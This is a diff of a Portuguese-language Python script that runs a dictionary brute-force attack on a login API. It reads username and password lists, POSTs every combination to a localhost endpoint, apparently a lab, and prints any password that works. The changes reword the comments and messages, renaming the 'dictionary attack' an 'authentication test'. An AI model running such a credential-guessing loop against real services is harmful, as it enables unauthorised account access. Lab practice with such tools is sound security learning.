@@ -1,20 +1,20 @@
 import requests
 
 # ==============================================================================
-# 1. CONFIGURAÇÕES
+# 1. PARÂMETROS DE EXECUÇÃO
 # ==============================================================================
-# Endereço da API do laboratório
+# Endpoint de autenticação do laboratório
 url = "http://127.0.0.1:8002/login"
 
 arquivo_usuarios = "usuarios.txt"
 arquivo_senhas = "senhas.txt"
 
 print("=" * 60)
-print("   INICIANDO ATAQUE DE DICIONÁRIO MULTI-USUÁRIO")
+print("   INICIANDO TESTE DE AUTENTICAÇÃO COM MÚLTIPLOS USUÁRIOS")
 print("=" * 60)
 
 # ==============================================================================
-# 2. CARREGAR OS ARQUIVOS PARA LISTAS NA MEMÓRIA
+# 2. CARREGAMENTO DOS DADOS PARA A MEMÓRIA
 # ==============================================================================
 with open(arquivo_usuarios, "r") as arq_u:
     usuarios = arq_u.read().splitlines()
@@ -22,39 +22,38 @@ with open(arquivo_usuarios, "r") as arq_u:
 with open(arquivo_senhas, "r") as arq_s:
     senhas = arq_s.read().splitlines()
 
-print("Usuários carregados:", len(usuarios))
-print("Senhas carregadas  :", len(senhas))
+print(f"Total de usuários carregados : {len(usuarios)}")
+print(f"Total de senhas carregadas   : {len(senhas)}")
 print("=" * 60)
 
 # ==============================================================================
-# 3. LOOP DUPLO: PARA CADA USUÁRIO, TESTA CADA SENHA
+# 3. EXECUÇÃO DOS LAÇOS ANINHADOS (USUÁRIO x SENHA)
 # ==============================================================================
 for usuario in usuarios:
-    print(f"\n[+] Testando usuário: >>> {usuario} <<<")
+    print(f"\n[+] Testando conta: {usuario}")
     senha_encontrada = False
 
     for senha in senhas:
-        # Monta os dados para o envio
+        # Monta a estrutura da requisição
         dados = {
             "usuario": usuario,
             "senha": senha
         }
 
-        # Faz a requisição POST para o login
+        # Dispara a requisição HTTP POST para a API
         resposta = requests.post(url, json=dados)
 
-        # Imprime o resultado do teste
-        print(f"    Tentando senha '{senha}' -> Status: {resposta.status_code}")
+        print(f"    Tentativa com senha '{senha}' -> Status: {resposta.status_code}")
 
-        # Se for 200, acertamos a senha deste usuário!
+        # Avalia se a credencial foi aceita pelo servidor
         if resposta.status_code == 200:
-            print(f"    >>> SUCESSO! Senha de '{usuario}' é: '{senha}' <<<")
+            print(f"    >>> SUCESSO! A senha do usuário '{usuario}' é: '{senha}' <<<")
             senha_encontrada = True
-            break  # Sai do loop de senhas e passa para o próximo usuário
+            break  # Interrompe o laço de senhas e avança para o próximo usuário
 
     if not senha_encontrada:
-        print(f"    [-] Nenhuma senha funcionou para o usuário '{usuario}'.")
+        print(f"    [-] Nenhuma senha da lista foi válida para o usuário '{usuario}'.")
 
 print("\n" + "=" * 60)
-print("Fim dos testes para todos os usuários.")
+print("Processo concluído para todos os usuários da lista.")
 print("=" * 60)
